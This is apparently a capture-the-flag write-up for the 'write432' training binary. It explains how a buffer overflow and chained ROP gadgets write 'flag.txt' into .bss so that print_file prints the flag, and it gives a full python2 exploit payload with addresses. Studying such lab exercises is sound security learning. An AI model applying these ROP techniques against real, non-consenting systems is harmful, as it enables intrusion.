Rahn Stavar
## Write-up:
![[Pasted image 20231217171946.png]]
`NX` bit is set and no `PIE`.
Opening the `write432` binary and its companion shared library up in Ghidra, reveals that `main` calls `pwnme`, which has a buffer overflow vulnerability. 
![[Pasted image 20231217172856.png]]
In the shared library there is also a useful function called `print_file`. 
![[Pasted image 20231217172827.png]]
This function takes a pointer to a string, which is the name of the file to read and print. I will aim to use this to print the contents of the `flag.txt` file.
Unfortunately, the string "flag.txt" doesn't exist anywhere within the binary or shared library, so I will need to write this string to memory somewhere, then pass a reference to it to `print_file()`.
To do this I will need to use a ROP gadget to construct a write to memory primitive.
![[Pasted image 20231217173301.png]]
The highlighted gadget in the above picture looks useful, but to use this I will also need to find a way to move my write address into `edi` and my string into `ebp`.
![[Pasted image 20231217173552.png]]
Luckily, there is another useful ROP gadget within the binary which `pop`s two values from the stack and places them in the `edi` and `ebp` registers.
I should be able to chain these two ROP gadgets together to create my write to memory primitive.
Since I am working with 32-bit registers, and my filename is 8 bytes long, I will need to do the write in two parts.
For my write location, I will use the beginning of the `.bss` section, which is usually used for storing uninitialized variables, as writing to this section during runtime is a normal thing for a program to do.
![[Pasted image 20231217175135.png]]
Lastly, to begin building my exploit payload, I need to find the offset of the return address from the overflowed buffer's start address.
![[Pasted image 20231217174248.png]]
As shown in the above screenshot, the offset to the `EIP` register, which stores the return address, is 44 bytes.
Putting this all together, my exploit will roughly look like:
```
44 bytes of junk

addr of pop ROP gadget # 0x080485aa
addr of .bss section # 0x0804a020
"flag"
addr of mov gadget # 0x08048543

addr of pop ROP gadget
addr of .bss section + 4 bytes
".txt"
addr of mov gagdet

addr of pop ROP gadget
addr of .bss section + 8 bytes
"\x00" * 4 # null bytes to signal string termination
addr of mov gagdet

addr of print_file function # 0x080483d0
dummy return addr # 0x00000000
addr of .bss section
```
Exploit:
```bash
python2 -c 'print \
"\x00"*44 + \
"\xaa\x85\x04\x08" + \
"\x20\xa0\x04\x08" + \
"flag" + \
"\x43\x85\x04\x08" + \
"\xaa\x85\x04\x08" + \
"\x24\xa0\x04\x08" + \
".txt" + \
"\x43\x85\x04\x08" + \
"\xaa\x85\x04\x08" + \
"\x28\xa0\x04\x08" + \
"\x00\x00\x00\x00" + \
"\x43\x85\x04\x08" + \
"\xd0\x83\x04\x08" + \
"\x00\x00\x00\x00" + \
"\x20\xa0\x04\x08" \
' > payload.txt
```
Calling `write432` using this payload gives the following output:
![[Pasted image 20231217221422.png]]
As shown in the image, the exploit was successful using this payload and the flag was printed.
This was achieved by crating a write primitive by chaining ROP gadgets together, and using this to create a string representing the flag filename and then passing this to the `print_file` function., causing the contents of the flag to be printed.